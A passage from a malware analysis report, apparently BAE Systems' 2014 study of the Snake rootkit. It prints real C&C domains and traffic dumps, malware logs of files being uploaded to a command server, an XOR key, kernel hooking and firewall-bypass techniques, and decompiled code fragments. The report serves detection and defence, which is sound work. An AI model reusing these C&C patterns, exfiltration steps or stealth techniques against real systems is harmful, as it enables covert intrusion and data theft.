 45   44.518185000   192.168.202.131      31.170.161.136      HTTP 219 GET /D/pub.txt HTTP/1.1
 47   44.743999000   31.170.161.136       192.168.202.131     HTTP 474 HTTP/1.1 302 Found (text/html)
 84   45.990199000   192.168.202.131      31.170.161.136      HTTP     233    GET /D/1/f42cce984070b8ab1c0 HTTP/1.1
 86   46.216079000   31.170.161.136       192.168.202.131     HTTP     474    HTTP/1.1 302 Found (text/html)
 94   46.525887000   192.168.202.131      31.170.164.249      HTTP     217    GET /? HTTP/1.1
101   46.939359000   192.168.202.131      192.168.202.2       DNS       82    Standard query 0x5ae5 A swim.onlinewebshop.net
102   46.940914000   192.168.202.2        192.168.202.131     DNS       98    Standard query response 0x5ae5 A 83.125.22.197
107   47.287205000   192.168.202.131      83.125.22.197       HTTP     224    GET /D/pub.txt HTTP/1.1
109   48.219805000   83.125.22.197        192.168.202.131     HTTP     330    HTTP/1.1 200 OK (text/html)
118   48.813394000   192.168.202.131      192.168.202.2       DNS   82 Standard query 0x5362 A july.mypressonline.com
119   48.814837000   192.168.202.2        192.168.202.131     DNS   98 Standard query response 0x5362 A 83.125.22.197
123   49.131675000   192.168.202.131      83.125.22.197       HTTP 224 GET /D/pub.txt HTTP/1.1
125   49.780323000   83.125.22.197        192.168.202.131     HTTP 330 HTTP/1.1 200 OK (text/html)
137   50.536285000   192.168.202.131      31.170.161.136      HTTP     220    GET /D/77568289 HTTP/1.1
139   50.762073000   31.170.161.136       192.168.202.131     HTTP     474    HTTP/1.1 302 Found (text/html)
147   51.101706000   192.168.202.131      31.170.164.249      HTTP     217    GET /? HTTP/1.1
154   51.548661000   192.168.202.131      83.125.22.197       HTTP     225    GET /D/77568289 HTTP/1.1
163   52.014730000   192.168.202.131      83.125.22.197       HTTP     225    GET /D/77568289 HTTP/1.1
165   52.637958000   83.125.22.197        192.168.202.131     HTTP     679    HTTP/1.1 200 OK (text/html)    
                                                                                                           Received command
The domain names of the C&C servers it relies on are hard-coded in the body of the malware. Some examples are given below, and
a full list of known domains is given in the Appendix D:
      
 north-area.bbsindex.com
      
 winter.site11.com
      
 swim.onlinewebshop.net
      
 july.mypressonline.com
      
 toolsthem.xp3.biz
      
 softprog.freeoda.com
      
 euassociate.6te.net
As seen in the traffic dump above, the malware first resolves the domain name of its C&C.
Next, it fetches a file /D/pub.txt, and expects the server to respond with a string 
, acknowledging it
s active:
      03:52:06 1336: Connect swim.onlinewebshop.net                    type(0)... OK
      03:52:06 1336: GET /D/pub.txt
      03:52:07 1336: Http status: 200
      03:52:07 1336: recv 1/1
      03:52:07 DownLoad 1 command(s)
Once acknowledged, it asks the server for a command, and the server returns a new command to execute:
      03:52:11 1404: Connect swim.onlinewebshop.net                    type(0)... OK
      03:52:11 1404: GET /D/77568289
      03:52:12 1404: Http status: 200
      03:52:12 1404: Command for all
      03:52:12 1404: recv 346/346
      03:52:12 Command Id:303149772662877808(130201837456870000)[13:42:25 05/08/2013]
                                                              BAE Systems Applied Intelligence: Snake Rootkit Report 2014        9
The command it receives from C&C above (swim.onlinewebshop.net) is encrypted. In order to decrypt it, the malware first
applies the XOR mask to the bytes that start from offset 0x40:
    1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6g
    s923HL34x2f5cvd0fk6c1a0s
An identical XOR mask was also used by Agent.BTZ.
Next, it calculates and confirms a CRC32 checksum within the command, further decrypts the data by using the Number Theory
Library (NTL), and makes sure the command is destined to the current host by matching the ID field in it.
                          0    1    2    3    4    5    6    7    8     9    A    B    C    D    E    F    0123456789ABCDEF
              00000000    74   E4   7E   F4   9E   8E   D8   65   B3    06   EB   B3   08   EA   3E   84   t.~....e......>.
              00000010    D5   A1   D2   ED   5D   0C   89   91   65    DE   4E   B6   0C   E2   2C   39   ....]...e.N...,9
              00000020    A9   8A   3D   B9   0B   C0   E6   12   E9    F9   81   0A   CF   C3   D9   0C   ..=.............
              00000030    5A   6A   15   B4   00   00   00   00   01    00   00   00   00   00   00   00   Zj..............
              00000040    31   64   4D   33   75   75   34   6A   37    46   77   34   73   6A   6E   62   1dM3uu4j7Fw4sjnb
              00000050    13   3D   D4   DA   90   F4   BA   35   1C    36   4A   79   69   96   B1   D4   .=.....5.6Jyi...
              00000060    D8   F1   07   6F   7B   CC   C4   68   9D    B7   86   3E   4B   6F   BA   FB   ...o{..h...>Ko..
              00000070    6E   AB   7B   29   32   FD   7C   75   B9    DF   7F   C0   0C   81   2D   14   n.{)2.|u......-.
              00000080    23   F9   A4   DF   D3   F1   18   97   4D    CD   71   D0   52   D6   A2   E9   #.......M.q.R...
              00000090    FF   58   30   3D   A8   8A   DD   4D   3F    DB   AE   9A   F5   07   3B   21   .X0=...M?.....;!
              000000A0    67   5A   34   22   AD   60   CB   DD   A4    E2   B5   77   A1   6A   4C   2E   gZ4
.`.....w.jL.
              000000B0    C8   75   91   01   CA   5B   B3   28   3E    55   C8   68   B2   2C   40   E4   .u...[.(>U.h.,@.
              000000C0    02   A9   64   8B   80   BD   0E   AB   58    25   00   40   6E   AB   DD   5B   ..d.....X%.@n..[
              000000D0    D1   0A   32   AE   4A   E2   60   79   BE    47   10   AE   73   35   4C   65   ..2.J.`y.G..s5Le
              000000E0    06   3C   AA   D8   F0   49   52   DB   22    A5   0D   7B   2B   4D   8A   D1   .<...IR.
..{+M..
              000000F0    21   5C   62   11   E6   13   E2   CA   AF    A5   4F   5A   9E   1C   AF   AE   !\b.......OZ....
              00000100    C4   1C   36   4D   A0   E4   72   3A   CD    07   A3   01   AE   E6   0A   84   ..6M..r:........
              00000110    D4   8B   03   FB   0D   68   19   FD   86    71   8E   FD   FC   2D   C3   5C   .....h...q...-.\
              00000120    49   A4   E3   40   9B   77   16   BA   86    4A   DD   0D   15   7D   B1   BD   I..@.w...J...}..
              00000130    A9   54   C3   F6   E4   05   72   B1   E6    B7   A5   A7   31   CE   29   8B   .T....r.....1.).
              00000140    EF   95   58   2A   2E   48   0E   7A   BD    B8   B7   CE   48   32   E2   48   ..X*.H.z....H2.H
              00000150    2E   E2   94   65   F0   19   FC   F5   ED    1B                                 ...e......
               
 Traffic is decrypted
                          0    1    2    3    4    5    6    7    8     9    A    B    C    D    E    F    0123456789ABCDEF
              00000000    49   44   33   30   33   31   34   39   37    37   32   36   36   30   38   34   ID30314977266084
              00000010    37   38   30   38   23   30   36   20   26    6D   61   72   6B   65   74   70   7808#06 &marketp
              00000020    6C   61   63   65   2E   73   65   72   76    65   68   74   74   70   2E   63   lace.servehttp.c
              00000030    6F   6D   26   2F   55   50   44   41   54    45   2F   26   63   65   72   74   om&/UPDATE/&cert
              00000040    31   30   32   34   26   55   6E   37   37    6B   6F   23   73   26   26   26   1024&Un77ko#s&&&
              00000050    0A                                                                               .
Once decrypted, the malware interprets the received command, as reflected in the malware log below (the new C&C server address
is highlighted in it):
    03:52:12 Del after 0
    03:52:12 Run instruction: 6 ID:303149772147483647(13:41:34 05/08/2013)
    03:52:12 Add address &marketplace.servehttp.com&/UPDATE/&cert1024&Un77ko#s&&&
    03:52:12 Finish run instruction.
After that, the malware connects to the new C&C, asking it for another command:
    03:52:13 1400: Connect marketplace.servehttp.com                              type(0)... OK
    03:52:13 1400: GET /IMAGE/pub.html
    03:52:15 1400: Http status: 200
    03:52:16 1400: recv 1/1
    03:52:16 DownLoad 1 command(s).
                                                                       BAE Systems Applied Intelligence: Snake Rootkit Report 2014   10
The command it receives is called UpLoad, so it uploads all the collected logs to the server, and then cleans out those logs:
    03:52:16 UpLoad: http upload 4 file(s).
    03:52:17 652: Connect marketplace.servehttp.com                       type(0)... OK
    03:52:17 652: GET test file /IMAGE/pub.html
    03:52:17 652: POST /IMAGE/2/55198739672286404661840843638320033
    03:52:18 652: C:\WINDOWS\$NtUninstallQ812589$\gstat32.bin 310[B]
    03:52:19 652: Http Status:200
    03:52:19 652: POST /IMAGE/2/32773318678423920155243775957661252
    03:52:19 652: result.xml 1278[B]
    03:52:20 652: Http Status:200
    03:52:21 652: POST /IMAGE/2/41535327538451061594793127961089611
    03:52:21 652: C:\WINDOWS\$NtUninstallQ812589$\mtmon32.sdb 655[B]
    03:52:22 652: Http Status:200
    03:52:22 652: POST /IMAGE/2/35192812459183876172895945534862460
    03:52:22 652: C:\WINDOWS\$NtUninstallQ812589$\mtmon.sdb 748[B]
    03:52:23 652: Http Status:200
The files it uploads are stored inside its home directory %windows%\$NtUninstallQ[random]$,
where [random] is a random number.
For example, Snake
s home directory could be C:\WINDOWS\$NtUninstallQ812589$.
The files within that directory are used by the rootkit to store configuration and log data.
When decrypted with the same XOR key that was used by Agent.BTZ, these files expose the following contents:
    
 mtmon.sdb - C&C communication log that looks as the logs shown above.
    
 mtmon_.sdb - installation log, that shows infected processes (Internet Explorer), the random name of the dropped DLL
       (e.g. kbdfaori.dll), log directory, and the registry entry ShellCore that stores other configuration details:
         03:52:02 TVer=1.2
         03:52:02 Parent:C:\Program Files\Internet Explorer\IEXPLORE.EXE
         03:52:02 ver 3.2.0.0a inj             dll K:0      PID:712,
         C:\WINDOWS\system32\kbdfaori.dll,
         hostID:ea5cfa5ea1681bd6(16887647987074341846)
         03:52:02 C:\WINDOWS\$NtUninstallQ812589$,
         Temp:C:\WINDOWS\$NtUninstallQ812589$\SPUNINST\Temp
         03:52:02 REG:Software\Microsoft\Windows\CurrentVersion\ShellCore
         03:52:02 ModuleStart: 03:51:42
 scmp.bin - pipe server log that shows its assigned name (COMPUTERNAME is the name of the test system) and
      what processes it operates from:
         02:04:24 TVer=1.6
         02:04:24 SPCOMPUTERNAME: Pipe server thread start
         02:04:24 Inj[1620]:explorer.exe
         03:51:42 Inj[712]:iexplore.exe
    
 ucmp.bin - another pipe server log:
         02:04:44 TVer=1.6
         02:04:44 UPCOMPUTERNAME: Pipe server thread start
                                                                 BAE Systems Applied Intelligence: Snake Rootkit Report 2014    11
INTER-PROCESS COMMUNICATIONS
Analysis of the sample reveals that it supports 3 modes of fetching C&C commands.
   In the first mode, it relies on Windows Internet (WinINet) APIs, such as HttpOpenRequest(), HttpSendRequest(),
        InternetReadFile(), etc.
   In the second mode, it uses Windows Sockets 2 (Winsock) APIs, such as WSAStartup(), socket(), connect(),
        send(), etc.
   In the third mode, it works in the 
pipe server
 mode, when it passes the web requests it is interested in (as a client) to the
        pipe server that runs within Windows Explorer (explorer.exe) and/or Internet Explorer (iexplore.exe) processes.
Memory pipes is a common mechanism for Inter-Process Communications (IPC). When the pipe server reads such requests from the
pipes, it performs the web request on behalf of a client by using WinINet APIs, so it effectively serves as a proxy.
The diagram below demonstrates the last, 
pipe server
 mode of Snake operation:
                   Injected Snake DLL               System Process
                                                   (e.g. services.exe)
                                                                    Snake DLL                    Internet
                                               3                 in 
pipe server
                                                                       mode
                                                                                            4
                                                                                                 3
Legitimate Process
                                                                                                                    Injected Snake DLL
 (e.g. a browser)
User Mode
                                 2
                                                                           1
Kernel Mode
                                                                                                                   Legitimate Process
                                                                                                                    (e.g. a browser)
                                                                                                            2
                                                                                    Embedded
                       Snake
s Kernel Mode                                          DLL Module
                        Driver, with the DLL
                       module embedded in it
The diagram illustrates the operation steps 1-4:
    1     First, the malicious driver with the embedded DLL module injects that DLL into a system process,
          such as services.exe; once loaded, the DLL will function in the 
pipe server
 mode.
          As soon as the driver detects a usermode process that goes online (e.g. a browser), it will inject malicious DLL module
    2     into it; depending on the operational mode, the DLL may start communicating with C&C directly.
          In the 
pipe mode
 of operation, the injected DLL will start communicating with the pipe server by sending messages into
    3     the established inter-process communication pipes.
          Once the task of communication with C&C is delegated to the pipe server, it will start communicating with the C&C,
    4
          bypassing the host-based firewalls that keep an infected system process in a white-list.
                                                                 BAE Systems Applied Intelligence: Snake Rootkit Report 2014         12
The reason behind the pipes usage is to 
legitimise
 the outbound web requests, forcing them to originate from the host firewall-
friendly system services.
Pipe server is a special mode of the injected DLL. In order to switch into that mode, a dedicated thread is spawned to listen for IPC
messages received through the pipes. The memory pipes used by Snake are named as:
    
 \\.\Pipe\SP[COMPUTERNAME]
    
 \\.\Pipe\UP[COMPUTERNAME]
    where [COMPUTERNAME] is the name of the host computer.
Apart from GET/POST requests, the pipe clients (infected usermode processes) may also ask the pipe server to perform other
operations on their behalf, such as saving data into a temporary file, copy/delete files, save configuration data into the registry
under the aforementioned ShellCore value.
This delegation of tasks is designed to keep infected processes under the radar of the behavioural analysis tools for as long as
possible. Another reason is to overcome account restrictions imposed on a browser process in order to be able to write into files/
registry.
To delegate different types of tasks, the clients send messages to the pipe server using the following task identification headers:
    
   DATA
    
   CREATE
    
   CMD
    
   POST
    
   GET
    
   DEL
    
   REGISTR
    
   COPY
The usermode component of Snake communicates with its kernel-mode driver via a device called \\.\vstor32 (created under
kernel as \Device\vstor32). In its communication protocol with the driver it uses the IOCTL code of 0x222038.
To write data, it opens the device with CreateFile(
\\.\vstor32
), then calls DeviceIoControl() API on its handle with
IOCTL code of 0x222038.
Configuration parameters along with the initial set of domain names are hard-coded within the body of the DLL. However, the data
appears to be defined in the structures, so it is very likely the DLL could be generated by a stand-alone builder that 
patches
 the
DLL with the new/updated list of C&C.
Analysis of the commands performed by the malware suggests the following capabilities:
    
   Scan the network for the presence of other hosts (maximum 1 hour is allocated for this task)
    
   Set maximum upload file size
    
   Go 
stealth
 mode for the specified number of days - Snake will not initiate any connections during that time
    
   Run specified shell commands and collect the output logs for further delivery
    
   Modify settings stored with the registry key HKLM\Software\Microsoft\Windows\CurrentVersion\ShellCore
    
   Search for files
    
   Upload specified files
    
   Add new C&C domains
    
   Update the driver with a new version
    
   Download files
    
   Run specified executable files
    
   Set self-deactivation timeout
    
   If the virtual partition \\.\vd1 exists, copy all Snake logs into that partition
Together, these commands provide complete backdoor functionality, allowing remote attacker full control over the compromised
system.
The ability to update the driver and then rely on its communication capabilities means that the components of Snake are flexible,
making possible the existence of the hybrid (kernel-centric and usermode-centric) architectures.
For example, the virtual partitions are used by kernel-centric Snake variants, where the kernel-mode driver is responsible for the
communications. If such a driver is installed via an update, the usermode component can be instructed to delegate the file upload
task to the driver by copying all the necessary logs into the shared virtual partition, physically located on the compromised host and
thus, accessible from kernel.
                                                                 BAE Systems Applied Intelligence: Snake Rootkit Report 2014           13
KERNEL-CENTRIC ARCHITECTURE
This particular architecture relies on a kernel-mode driver to carry out the network communications. The usermode DLLs are still
injected into the system processes to perform high-level tasks.
The delivery mechanism is not known: it may be distributed via a thumb-drive, a phishing email attachment, or be delivered via an
exploit across the network (e.g. by using the reconnaissance tool that is explained later).
Infection starts from a dropper penetrating into the compromised system where it is allowed to run. Once executed, the dropper
installs the kernel mode driver in a pre-defined location. The dropper itself is 32-bit, so it will run both on 32-bit and 64-bit Windows
OS (in WoW64 mode). On a 32-bit OS, it will install a 32-bit driver. On a 64-bit OS, it will install a 64-bit driver.
The analysed 32-bit dropper creates a driver in the following location:
%windows%\$NtUninstallQ817473$\fdisk.sys
However, different samples may use a different path and driver file name. For example, some samples exposed these filenames:
fdisk_32.sys, A0009547.sys, or Ultra3.sys. The filename of the dropper could be rkng_inst.exe or fdisk_mon.exe.
REGISTRATION
Once executed, the driver first makes sure it is registered under a pre-defined name, such as Ultra3.
Other samples may have a different registration name, such as ~ROOT. The registration is ensured with creation of the following
registry entries:
    ErrorControl = 0
    Group = 
Streams Drivers
    ImagePath = %windows%\$NtUninstallQ817473$\fdisk.sys
    Start = 1 [SYSTEM]
    Type = 1
in the newly created registry key
    HKEY_LOCAL_MACHINE\System\CurrentControlSer\Services\Ultra3
The driver then flags the following events with the notification purposes:
    \BaseNamedObjects\{B93DFED5-9A3B-459b-A617-59FD9FAD693E}
    \BaseNamedObjects\shell.{F21EDC09-85D3-4eb9-915F-1AFA2FF28153}
The rootkit then places a number of the hooks.
SYSTEM HOOKS
The first API it hooks is IoCreateDevice(). The installed hook handler calls the original API and then checks if the name of the
device is netbt or afd. If so, it will install a TDI filter driver. If the device name is Null, Beep, tcpip or Nsiproxy, it will activate
itself by enabling its hooks designed to hide the presence of Snake on a system, set up its access control lists and the messaging
system.
In order to hide its components, the driver hooks the following APIs:
    
 ZwQueryKey
    
 ZwEnumerateKey
    
 ZwCreateKey
    
 ZwSaveKey
    
 ZwReadFile
    
 ZwQuerySystemInformation
    
 ZwQueryInformationProcess
    
 ZwClose
    
 ZwTerminateProcess
    
 ZwShutdownSystem
    
 ObOpenObjectByName
                                                                 BAE Systems Applied Intelligence: Snake Rootkit Report 2014           14
For example, the hook handlers of the registry-related APIs will block access to the registry entries that contain the name of the
driver. In one example, the rootkit blocks access to registry entries that contain the strings 
Ultra3
 and 
~ROOT
The ZwReadFile() hook handler will block access to the home directory where the rootkit keeps its file. In one of the analysed
kernel-centric Snake samples the home directory was hard-coded as %windows%\$NtUninstallQ817473$, so it blocked file
read access from that directory.
The ZwClose() hook handler is used to inject the DLL module into the userland processes.
The hook handler for ZwTerminateProcess() checks if the process being shut down is svchost.exe. If so, it considers
it to be a system shutdown, so it unloads its usermode DLL and deactivates its own network drivers, just like it does when its
ZwShutdownSystem() hook handler gets invoked.
The ObOpenObjectByName() hook is designed to hide the presence of its virtual partitions (described later).
To encrypt data stored on its virtual partitions, the driver sets a hook for another API:
         IofCallDriver()
To re-infect the usermode process svchost.exe and to re-enable its network drivers, the rootkit hooks these APIs:
    
 ZwCreateThread
    
 ZwCreateUserProcess
WFP CALLOUT DRIVER
Snake then proceeds to the task of deep packet inspection and modification.
In order to accomplish it, it registers a callout driver for Windows Filtering Platform (WFP), an architecture first introduced with
Windows Vista and nowadays normally used by antivirus and/or intrusion detection systems to inspect/block malicious traffic.
Snake sets filters at the layers FWPM_LAYER_STREAM_V4 and FWPM_LAYER_ALE_FLOW_ESTABLISHED_V4 in the TCP/
IP stack, so that its callout driver is notified whenever a TCP connection is established by a browser. When that happens, the
rootkit triggers an event named \BaseNamedObjects\wininet_activate. When the data arrives, it is intercepted with the
FwpsCopyStreamDataToBuffer0() API, and then scanned for the presence of the hidden commands from C&C.
The driver inspects bidirectional network data on a per stream basis, as it
s located right on the stream data path. An ability to
manipulate data streams is provided with the packet injection logic below, allowing Snake to covertly insert traffic destined to its
C&C servers:
      01    int __stdcall stream_inject(int flowHandle, int calloutId, int layerId)
      02    {
      03        int iRet = 0;
      04        int ntStatus = FwpsAllocateNetBufferAndNetBufferList(m_hNdisNblPool, 0, 0, 0, 0, &iRet);
      05        if (!ntStatus)
      06        {
      07            ntStatus = _FwpsStreamInjectAsync(m_hInjection,
      08                                               0,
      09                                               0,
      10                                               flowHandle,
      11                                               calloutId,
      12                                               layerId,
      13                                               20,
      14                                               3,
      15                                               iRet,
      16                                               0,
      17                                               sStreamInjectCompletion,
      18                                               0);
      19        if (!ntStatus)
      20        {
      21            iRet = 0;
      22        }
      23        if (iRet)
      24        {
      25           FwpsFreeNetBufferList(iRet);
      26        }
      27        return ntStatus;
      28    }
                                                                 BAE Systems Applied Intelligence: Snake Rootkit Report 2014           15
In order to qualify as a browser, the usermode process must have any of the following names:
        01    bool isBrowserProcess(const wchar_t *szProcName)
        02    {
        03        return !wcsicmp(szProcName, L
iexplore.exe
) ||
        04               !wcsicmp(szProcName, L
firefox.exe
) ||
        05               !wcsicmp(szProcName, L
opera.exe
) ||
        06               !wcsicmp(szProcName, L
netscape.exe
) ||
        07               !wcsicmp(szProcName, L
mozilla.exe
) ||
        08               !wcsicmp(szProcName, L
chrome.exe
        09    }
TDI FILTER DRIVER
In addition to WFP, Snake also hooks the Transport Driver Interface (TDI) network routines by setting itself up as a TDI filter driver.
TDI is considered deprecated and will be removed in future versions of Microsoft Windows, but it
s still supported on Windows 7.
Being registered as a TDI driver on the device stack, Snake hooks TCP calls. This way it intercepts all requests along with their
parameters via IRP (IO request package) hooks.
sniffing
 all the requests, it can now inspect the traffic, looking for and then parsing GET/POST HTTP requests and also SMTP
communications, in order to distinguish commands addressed to itself.
If the rootkit detects that the OS version is pre-Vista (e.g. Windows XP) or Windows Server 2008 (e.g. Windows Server 2003), it will
invoke FwpsStreamInjectAsync0() API in order to generate outbound requests.
Whenever the client establishes connections, the TDI driver will also 
pulse
 the \BaseNamedObjects\wininet_activate
event, just like the WPF driver
s component of it, in order to notify the userland service about the event.
The data that the driver intercepts, along with the important notifications, is passed to the userland DLL to be processed. If the
data contains commands from C&C, the DLL module is expected to execute them and report results back to the driver to be
delivered back to C&C.
NDIS HOOKING
For NDIS versions 5.X, Snake rootkit contains code that installs NDIS filter intermediate driver.
This driver is set up above a miniport driver (a driver that communicates with the physical device) and below a protocol driver (a
driver that implements a protocol, e.g. TCP/IP).
The driver is registered with NdisIMRegisterLayeredMiniport() API.
After that, the drivers hooks the following exports within ndis.sys:
    
 NdisIMRegisterLayeredMiniport
    
 NdisTerminateWrapper
The rootkit contains code that installs NDIS filter driver for NDIS 6.0 and above:
    Unique name: {c06b1a3b-3d16-4181-8c8d-7015bfc5b972}
    User-readable description: filter_c06b1a3b
NDIS filter driver configuration is stored in the registry entry:
    HKLM\SYSTEM\CurrentControlSet\Control\Network\{4d36e974-e325-11ce-bfc1-08002be10318}
The driver is registered with NdisFRegisterFilterDriver() API.
                                                                    BAE Systems Applied Intelligence: Snake Rootkit Report 2014           16
After that, the drivers hooks the following exports within ndis.sys (for NDIS 6.0):
    
 NdisFRegisterFilterDriver
    
 NdisFDeregisterFilterDriver
    
 NdisSetOptionalHandlers
    
 NdisFSetAttributes
Another set of exports it attempts to hook in ndis.sys (for NDIS 6.0) is:
    
 NdisMRegisterMiniportDriver
    
 NdisMDeregisterMiniportDriver
    
 NdisMIndicateReceiveNetBufferLists
    
 NdisMRestartComplete
    
 NdisMPauseComplete
With the hooks installed, whenever the network adapter driver attempts to register to NDIS, or whenever there is an attempt to
install NDIS intermediate driver or NDIS filter driver, the hook handlers will register Snake
s own MiniportXxx functions with the NDIS
library.
With its own miniport handler functions, it can send/receive data by using a private TCP/IP stack, bypassing all firewall hooks, and
making its open ports invisible to scanners.
NDIS PROTOCOL DRIVER
The Snake rootkit registers itself as Network Driver Interface Specification (NDIS) protocol driver.
    Intercepting Network Data                                              Whenever the underlying miniport driver
                                                                           receives data from the network, it calls NDIS
                                                                           by invoking a data receive indication function
                                NdisMIndicateReceiveNetBufferLists()
                                                                           NdisMIndicateReceiveNetBufferLists().
     NDIS Protocol                                        Miniport
                                  NDIS                                     When that happens, NDIS invokes Snake
s hook function
        Driver                                             Driver
                                                                           (ProtocolReceiveNetBufferLists) to process the
       ProtocolReceiveNetBufferLists()                                     received data.
    Sending Network Data                                                   To send the data back, the protocol driver defines the data
                                                                           in a list of NET_BUFFER_LIST structures, and then passes
                                    MiniportSendNetBufferLists()
                                                                           them to NDIS by calling NdisSendNetBufferLists().
     NDIS Protocol                                       Miniport
                                  NDIS                                     NDIS, in turn, calls the miniport driver
        Driver                                            Driver
                                                                           MiniportSendNetBufferLists() function to forward
           NdisSendNetBufferLists()                                        the data to an underlying miniport driver.
Being able to fully manipulate traffic at 3 different levels (NDIS protocol driver, TDI Driver, and WPF callout driver), Snake is able to
inject
 the traffic into existing communications to reach out to external components, and at the same time parse all incoming traffic
to detect traffic addressed to itself:
                                                                                       Infected User        Injected
                                    Traffic Interception                                 Application        Module
                                0xDEADBEAF/0xC001BA5E
                                           Checks
                                                    WFP           TDI          NDIS
                  Internet                                                                                        Memory
                                                                                                                   pipes
                                      Traffic
                                    Injection
                                                                        Snake
s Kernel Mode Driver
                                                                BAE Systems Applied Intelligence: Snake Rootkit Report 2014           17
DEAD BEEF ON A COOL BASE
As the driver intercepts all connections (e.g. on TDI_RECEIVE TDI event or ClientEventReceive() event notification triggered
through its TDI Filter Driver), it parses all incoming HTTP and SMTP traffic to see if it can be authenticated as Snake traffic.
The authentication is implemented by decrypting the data and making sure it starts with the markers 0xDEADBEAF and
0xC001BA5E (which appear to derive from 
DEAD BEEF
 and 
COOL BASE
Here are specific steps:
    
   The data it accepts should start from a 10 byte signature with the following rules:
         
     the first 8 bytes must all be ASCII characters, the parser calculates their total sum (sum):
                 01         for (int i = 0; i < 8; i++)
                 02         {
                 03         
      if (*(BYTE *)ptrBuffer <= 32 ||
                 04         
          *(BYTE *)ptrBuffer >= 128)
                 05         
                 06         
return 0;                                           // if not ASCII, quit
                 07         
                 08         
      sum += *(BYTE *)ptrBuffer;                    // add to sum
                 09         
      ++ptrBuffer;                                  // advance buffer pointer
                 10         }
         
     9th byte must be equal to sum / 26 + 65
         
     10th byte must be equal to 122 - sum % 26
                 01         if ((*(BYTE *)ptrBuffer != sum / 26 + 65) ||
                 02             (*(BYTE *)(ptrBuffer + 1) != 122 - sum % 26))
                 03         {
                 04                result = 0;
                 05         }
    Starting from the 11th byte, the data must be base64-encoded; the parser decodes that data
           01          base_64_decode(abyBuffer + 10,
           02                         &ptrDecoded,
           03                         iMaxLength - 10);
    
   Once decoded, the decrypted data should contain the aforementioned markers:
          .text:F6751426              lea          eax, [ebp+dwMarker]                            ; return marker here
          .text:F6751429              push         eax
          .text:F675142A              mov          ecx, [ebp+buf_len]                             ; traffic
s buffer length
          .text:F675142D              push         ecx
          .text:F675142E              mov          edx, [ebp+abyBuffer]                           ; traffic
s buffer pointer
          .text:F6751431              push         edx
          .text:F6751432              call         decrypt_traffic                                ; decrypt traffic first
          .text:F6751437              test         eax, eax
          .text:F6751439              jz           short exit                                     ;   if failed, exit
          .text:F675143B              mov          eax, [ebp+dwMarker]                            ;   check the returned marker
          .text:F675143E              cmp          eax, _DEADBEAF                                 ;   _DEADBEAF dd 0DEADBEAFh
          .text:F6751444              jnz          short exit                                     ;   if not 0xDEADBEAF, exit
          .text:F6751446              cmp          [ebp+dwNextDword], 0C001BA5Eh                  ;   check next DWORD
          .text:F675144D              jnz          short next                                     ;   if not 0xC001BA5E, exit
    When the traffic is authenticated, its contents is then parsed by using 
POST
http://
HTTP/
         
Content-Length
Connection
close
 tags, in order to retrieve HTTP requests
    SMTP traffic is also parsed, only by using 
MAIL 
RCPT 
 tags in order to retrieve SMTP characteristics
                                                                  BAE Systems Applied Intelligence: Snake Rootkit Report 2014   18
By observing such behaviour, one might wonder why the driver is expecting HTTP or SMTP clients? Why does it act like HTTP/SMTP
server processing client traffic, and serving back normal responses as per the protocol?
For example, in HTTP the driver will respond with messages like 
HTTP/1.1 200 OK
 or 
HTTP/1.1 500 Server Error
For SMTP traffic, it communicates back normal SMTP server responses, such as 
250 Sender OK
503 Bad sequence of
commands
, etc.
The reason behind such behaviour is that the driver is acting in this mode like a proxy, routing requests from other infected hosts to
a remote C&C server.
Another opportunity this mode unlocks is a peer-to-peer network mode with no centralised C&C. The infected hosts are capable
of transferring the following peer-2-peer commands defining fragment size, reliability parameters, new peer information, peer
impersonation flags, etc.:
    
 frag_size
    
 frag_no_scrambling
    
 peer_frag_size
    
 read_peer_nfo
    
 write_peer_nfo
    
 imp_level
    
 reliable_n_tries
    
 reliable_keepalive
    
 reliable_rtt
    
 reliable_padding
    
 reliable_no_keepalive
    
 m2b_raw
    
 psk
    
 key
Once the incoming data is authenticated and decrypted, the driver passes it to the DLL by using memory pipes.
For example, on HTTP traffic arrival it may send traffic data into a memory pipe \Device\NamedPipe\isapi_http, and then,
send a received peer-2-peer command message write_peer_nfo=[IP_ADDRESS:PORT]0frag_no_scrambling=Y0 into
another memory pipe called \Device\NamedPipe\isapi_dg.
In order to log its activity, the driver writes log data into the pipe \Device\NamedPipe\isapi_log, so that the DLL could log the
data into the log files.
Full list of the named pipes used for communications is provided below:
    
 \Device\NamedPipe\isapi_http
    
 \Device\NamedPipe\isapi_log
    
 \Device\NamedPipe\isapi_dg
    
 \Device\NamedPipe\services_control
Messages submitted into the pipes are wrapped into the structures. The structures appear to contain headers to allow the pipe
server, that runs within an infected userland module, to identify the messages first and then unwrap the structures accordingly.
For example, the message headers could be:
    
 domc.np
    
 frag.np
Once received from the pipes and unwrapped/decoded, the data is then handled by the usermode DLL as per the data intention -
whether it
s a traffic sniffing task, a peer-2-peer client logic, a logging task, or a task of saving received files into the virtual volumes.
                                                                   BAE Systems Applied Intelligence: Snake Rootkit Report 2014             19
VIRTUAL FILE VOLUMES
The driver creates virtual file volumes for encrypted storage of its files and configuration data:
    
 \\.\Hd1
    
 \\.\Hd2
The volumes are mounted from the virtual file systems RawDisk1 and RawDisk2.
The first partition is created with the following steps:
    
   the driver creates a 100Mb (0x6400000 bytes) file %windows%\$NtUninstallQ817473$\hotfix.dat by calling
         IoCreateFile() API
    
   then it creates a section object with the flags SEC_COMMIT and SEC_NOCACHE (0x18000000) by calling
         ZwCreateSection(); the flags mean the file is mapped into memory, the entire range of pages will be committed
    
   next, it maps a view of the created section into the virtual address space by calling ZwMapViewOfSection()
    
   finally, it creates device \Device\RawDisk1 from the section map and mounts it as \\.\Hd1
The hook installed by the rootkit on IofCallDriver() API provides on-the-fly data encryption/decryption whenever that data is
written to or read from the volume. The encryption algorithm is based on CAST-128, with the hard-coded key stored in the rootkit
body.
As a result, whenever the data is saved into the volume Hd1, it will be scrambled on-the-fly, and reflected in the persistent storage
file hotfix.dat, which is physically located within the rootkit
home
 directory:
   Z:\WINDOWS\$NtuninstallQ817473$>dir
     Volume in drive Z has no label.
     Volume Serial Number is 2479-98AC
     Directory of Z:\WINDOWS\$NtuninstallQ817473$
   13/02/2014        04:47 PM         <DIR>                 .
   13/02/2014        04:47 PM         <DIR>                 ..
   03/02/2014        01:57 PM                    210,944 fdisk.sys
   13/02/2014        04:47 PM              104,857,600 hotfix.dat
                         2 File(s)          105,068,544 bytes
                         2 Dir(s)        8,406,433,792 bytes free
Analysis of the hotfix.dat file contents reveals it
s a fully encrypted file with flat entropy. Thus, it is not possible to reveal the
contents of the Snake
